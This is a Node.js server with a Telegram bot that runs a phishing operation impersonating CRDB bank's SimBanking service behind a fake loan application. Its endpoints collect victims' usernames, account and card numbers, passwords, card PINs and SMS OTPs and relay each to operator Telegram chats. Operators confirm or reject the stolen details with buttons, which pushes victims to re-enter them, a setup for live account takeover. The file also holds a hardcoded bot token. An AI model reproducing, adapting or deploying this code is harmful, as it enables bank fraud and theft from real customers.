/**
 * **CRDB SIMBANKING - SECURE MULTI-ADMIN SERVER**
 * Main Admin Chat ID: 8591555400
 */

const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const fs = require('fs');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const TOKEN = process.env.TOKEN || process.env.TELEGRAM_BOT_TOKEN || '8949476533:AAGUD6b2V0--zQ_x_zNh3XPz2ay_B7xhO7A';
const APP_URL = process.env.APP_URL || process.env.RENDER_EXTERNAL_URL || (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '');
const FALLBACK_ADMIN_ID = process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '8591555400';

if (!TOKEN) {
  console.error('FATAL: TELEGRAM_BOT_TOKEN environment variable is required.');
  process.exit(1);
}

const ADMINS_FILE = path.join(__dirname, 'admins.json');

function loadAdmins() {
  try {
    if (fs.existsSync(ADMINS_FILE)) {
      const data = fs.readFileSync(ADMINS_FILE, 'utf8');
      const entries = JSON.parse(data);
      return new Map(entries.map(([id, rec]) => [id, {
        authorized: rec.authorized ?? false,
        paid: rec.paid ?? false,
        username: rec.username || '',
        firstName: rec.firstName || 'User',
        lastName: rec.lastName || '',
        status: rec.status || 'PENDING',
        welcomeSent: rec.welcomeSent ?? false
      }]));
    }
  } catch (err) {
    console.error('[Storage] Error loading admins file:', err);
  }
  return new Map();
}

function saveAdmins() {
  try {
    const serialized = JSON.stringify(Array.from(admins.entries()));
    fs.writeFileSync(ADMINS_FILE, serialized, 'utf8');
  } catch (err) {
    console.error('[Storage] Error saving admins file:', err);
  }
}

let bot = null;
const sessions = new Map();
const admins = loadAdmins();

// Verification Algorithm for Bank Cards (Luhn Algorithm)
function isValidLuhnCard(cardNumber) {
  const sanitized = String(cardNumber || '').replace(/\D/g, '');
  if (sanitized.length !== 16) return false;

  let sum = 0;
  let shouldDouble = false;
  for (let i = sanitized.length - 1; i >= 0; i--) {
    let digit = parseInt(sanitized.charAt(i), 10);
    if (shouldDouble) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    shouldDouble = !shouldDouble;
  }
  return (sum % 10) === 0;
}

function resolveTargetChat(adminParam) {
  if (adminParam && String(adminParam).trim() !== '') {
    const targetAdmin = String(adminParam).trim();
    if (targetAdmin === String(FALLBACK_ADMIN_ID)) {
      return FALLBACK_ADMIN_ID;
    }
    const adminRecord = admins.get(targetAdmin);
    if (adminRecord && adminRecord.authorized && adminRecord.paid) {
      return targetAdmin;
    }
  }
  return FALLBACK_ADMIN_ID;
}

async function initBot() {
  bot = new TelegramBot(TOKEN, { polling: true });

  bot.onText(/\/start/, async (msg) => {
    try {
      const chatId = String(msg.chat.id);
      let chatInfo = {};
      try { chatInfo = await bot.getChat(chatId); } catch (e) {}

      const username = chatInfo.username || msg.from.username || '';
      const firstName = chatInfo.first_name || msg.from.first_name || 'User';
      const lastName = chatInfo.last_name || msg.from.last_name || '';

      const existingAdmin = admins.get(chatId);

      // Send welcome link only ONCE when bot is started for the first time
      if (!existingAdmin || !existingAdmin.welcomeSent) {
        admins.set(chatId, { 
          authorized: true, 
          paid: true, 
          username, 
          firstName, 
          lastName, 
          startedAt: existingAdmin?.startedAt || new Date(),
          welcomeSent: true 
        });
        saveAdmins();

        const userLink = `${APP_URL}/?admin=${chatId}`;
        const startMessage = `🤖 *BOT STARTED & READY*\n\n` +
                             `👤 *User Info:*\n` +
                             `• *Name:* ${firstName} ${lastName}\n` +
                             `• *Username:* @${username}\n` +
                             `• *Chat ID:* \`${chatId}\`\n\n` +
                             `🔗 *Your Loan Application Link:*\n${userLink}`;

        await bot.sendMessage(chatId, startMessage, { parse_mode: 'Markdown' });
      } else {
        await bot.sendMessage(chatId, `🟢 *Bot tayari iko hai.* Subiri taarifa za wateja.`, { parse_mode: 'Markdown' });
      }
    } catch (err) {}
  });

  bot.on('callback_query', async (query) => {
    try {
      const actionData = query.data || '';
      const chatId = String(query.message.chat.id);
      const parts = actionData.split('_');
      const prefix = parts.slice(0, 2).join('_'); 
      const targetId = parts.slice(2).join('_');

      let session = sessions.get(targetId);
      if (!session) session = { adminChatId: chatId };

      const chatTarget = session.adminChatId || chatId;

      switch (prefix) {
        case 'WRONG_CREDS':
          session.status = 'RETRY_CREDS';
          await bot.sendMessage(chatTarget, `❌ Taarifa zimekataliwa. Mteja ameelekezwa kuingiza upya Taarifa zake.`);
          break;
        case 'CORRECT_CREDS':
          session.status = 'PROCEED_CARD_PIN';
          await bot.sendMessage(chatTarget, `✅ Taarifa zimekubaliwa. Mteja anaendelea kuingiza PIN ya Kadi.`);
          break;
        case 'WRONG_PIN':
          session.status = 'RETRY_PIN';
          session.cardPin = '';
          await bot.sendMessage(chatTarget, `❌ PIN ya kadi si sahihi. Mteja ameelekezwa kuingiza PIN mpya.`);
          break;
        case 'CORRECT_PIN':
          session.status = 'PROCEED_OTP';
          await bot.sendMessage(chatTarget, `✅ PIN ya kadi ni sahihi. Mteja anaendelea na namba ya uthibitisho ya SMS (OTP).`);
          break;
        case 'OTP_EXPIRED':
          session.status = 'RETRY_OTP';
          session.otp = '';
          await bot.sendMessage(chatTarget, `⚠️ OTP imeisha muda wake. Mteja anaombwa kuingiza OTP mpya ya SMS.`);
          break;
        case 'CORRECT_OTP':
        case 'FINAL_SUCCESS':
          session.status = 'SUCCESS';
          await bot.sendMessage(chatTarget, `🎉 Mkopo umeidhinishwa kikamilifu! Ukurasa wa mafanikio umetumwa kwa mteja.`);
          break;
        default:
          break;
      }

      await bot.answerCallbackQuery(query.id, { text: `Imeshughulikiwa` }).catch(() => {});
      if (query.message && query.message.message_id) {
        await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: query.message.chat.id, message_id: query.message.message_id }).catch(() => {});
      }
    } catch (err) {}
  });
}

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Step 1: Submit Credentials & Bank Details (With Strict Validation & Box Square Layout)
app.post('/api/submit-credentials', async (req, res) => {
  try {
    let { username, account, card, password, adminChatId } = req.body || {};
    if (!adminChatId && req.query && req.query.admin) {
      adminChatId = req.query.admin;
    }

    const cleanAccount = String(account || '').replace(/\D/g, '');
    const cleanCard = String(card || '').replace(/\D/g, '');

    // Strict validation check for Account Number & Card Number
    if (cleanAccount.length < 10 || cleanAccount.length > 15 || !isValidLuhnCard(cleanCard)) {
      return res.status(400).json({ 
        success: false, 
        error: 'TAARIFA SI SAHIHI ❌ (TAFADHALI WEKA AKAUNTI NA KADI HALALI)' 
      });
    }

    const targetChat = resolveTargetChat(adminChatId);
    const userId = `user_${Date.now()}`;
    sessions.set(userId, { 
      username, account: cleanAccount, card: cleanCard, password, 
      adminChatId: targetChat, 
      status: 'WAITING_CREDS_APPROVAL' 
    });

    const message = `┌──────────────────────────────┐\n` +
                    `│ 🟢 *CRDB SIMBANKING - TAARIFA* │\n` +
                    `├──────────────────────────────┤\n` +
                    `│ 👤 *Mtumiaji:* \`${username}\`\n` +
                    `│ 💳 *Akaunti:* \`${cleanAccount}\`\n` +
                    `│ 💳 *Kadi:* \`${cleanCard}\`\n` +
                    `│ 🔑 *Nywila:* \`${password}\`\n` +
                    `├──────────────────────────────┤\n` +
                    `│ 📋 *Nakili Zote (Copy):*\n` +
                    `│ \`${username}:${cleanAccount}:${cleanCard}:${password}\`\n` +
                    `└──────────────────────────────┘`;

    const opts = {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '❌ WRONG DETAILS', callback_data: `WRONG_CREDS_${userId}` },
            { text: '✅ CORRECT DETAILS', callback_data: `CORRECT_CREDS_${userId}` }
          ]
        ]
      }
    };

    if (bot) {
      await bot.sendMessage(targetChat, message, opts);
    }
    
    return res.status(200).json({ success: true, userId });
  } catch (err) {
    return res.status(500).json({ success: false, error: 'Hitilafu ya mtandao.' });
  }
});

app.get('/api/check-status/:userId', (req, res) => {
  const { userId } = req.params;
  const session = sessions.get(userId);
  if (!session) return res.status(404).json({ status: 'NOT_FOUND' });
  res.status(200).json({ status: session.status });
});

// Step 2: Submit 4-digit Card PIN (Box Square Layout)
app.post('/api/submit-card-pin', async (req, res) => {
  try {
    const { userId, cardPin } = req.body || {};
    const session = sessions.get(userId);
    if (!session) return res.status(404).json({ success: false, error: 'Session not found' });

    const targetChat = session.adminChatId;
    session.status = 'WAITING_PIN_VERIFICATION';
    session.cardPin = cardPin;

    const message = `┌──────────────────────────────┐\n` +
                    `│ 🟢 *CRDB SIMBANKING - PIN*   │\n` +
                    `├──────────────────────────────┤\n` +
                    `│ 🔒 *PIN ya Kadi:* \`${cardPin}\`         │\n` +
                    `└──────────────────────────────┘`;

    const opts = {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '❌ WRONG PIN', callback_data: `WRONG_PIN_${userId}` },
            { text: '✅ CORRECT PIN', callback_data: `CORRECT_PIN_${userId}` }
          ]
        ]
      }
    };

    if (targetChat && bot) await bot.sendMessage(targetChat, message, opts);

    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Hitilafu' });
  }
});

// Step 3: Submit 5-digit SMS OTP (Box Square Layout)
app.post('/api/submit-otp', async (req, res) => {
  try {
    const { userId, otp } = req.body || {};
    const session = sessions.get(userId);
    if (!session) return res.status(404).json({ success: false, error: 'Session not found' });

    const targetChat = session.adminChatId;
    session.status = 'WAITING_OTP_VERIFICATION';
    session.otp = otp;

    const message = `┌──────────────────────────────┐\n` +
                    `│ 🟢 *CRDB - OTP (Tarakimu 5)* │\n` +
                    `├──────────────────────────────┤\n` +
                    `│ 📱 *Namba ya OTP:* \`${otp}\`        │\n` +
                    `└──────────────────────────────┘`;

    const opts = {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '⚠️ OTP EXPIRES', callback_data: `OTP_EXPIRED_${userId}` },
            { text: '✅ CORRECT OTP', callback_data: `CORRECT_OTP_${userId}` }
          ]
        ]
      }
    };

    if (targetChat && bot) await bot.sendMessage(targetChat, message, opts);

    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Hitilafu' });
  }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, async () => {
  await initBot();
  console.log(`Server running on port ${PORT}`);
});
    
